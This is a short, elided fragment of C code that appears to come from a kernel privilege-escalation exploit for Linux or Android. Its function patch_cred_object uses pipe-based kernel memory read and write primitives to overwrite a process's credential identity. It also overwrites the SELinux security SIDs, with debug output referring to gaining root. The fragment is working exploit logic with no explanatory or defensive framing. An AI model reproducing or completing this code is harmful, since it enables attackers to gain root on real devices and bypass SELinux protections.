...
int patch_cred_object(int fd, uintptr_t cred) {
  /* A17/e: the sid write is inlined here (e keeps patch_cred_sid as a
   * standalone function AND an inlined copy in patch_cred_object). */
  if (!patch_cred_identity(fd, cred))
    return 0;
  uint64_t security = pipe_read64(fd, cred + CRED_SECURITY_OFF);
  if (!is_direct_ptr(security)) {
    pr_info("root bad cred security cred=%016llx security=%016llx\n",
  ...
  uintptr_t osid_addr =
    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair)) != 0;
}
